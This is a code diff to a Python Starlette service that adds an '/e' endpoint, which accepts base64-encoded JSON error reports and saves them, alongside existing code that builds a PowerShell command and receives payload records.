@@ -12,7 +12,7 @@ from starlette.exceptions import HTTPException as StarletteHTTPException
 from starlette.responses import Response
 
 from app.config import ADMIN_ENABLED
-from app.repository import save_payload_record, verify_database_connection
+from app.repository import save_error_record, save_payload_record, verify_database_connection
 
 if ADMIN_ENABLED:
     from app.admin import router as admin_router
@@ -103,6 +103,10 @@ def build_powershell_command(
 
 def save_payload(payload: dict[str, Any]) -> dict[str, Any]:
     return save_payload_record(payload)
+
+
+def save_error(error_report: dict[str, Any]) -> dict[str, Any]:
+    return save_error_record(error_report)
 
 
 def render_windows_script(*, close_terminal: bool = False, debug_mode: bool = False) -> str:
@@ -228,6 +232,22 @@ async def receive_payload(request: Request) -> Response:
         return PlainTextResponse("", status_code=400)
 
     save_payload(payload)
+
+    return Response(status_code=200, content=b"")
+
+
+@app.post("/e")
+async def receive_error(request: Request) -> Response:
+    raw_body = (await request.body()).decode("utf-8").strip()
+    try:
+        error_report = json.loads(base64.b64decode(raw_body))
+    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
+        return PlainTextResponse("", status_code=400)
+
+    if not isinstance(error_report, dict):
+        return PlainTextResponse("", status_code=400)
+
+    save_error(error_report)
 
     return Response(status_code=200, content=b"")
 
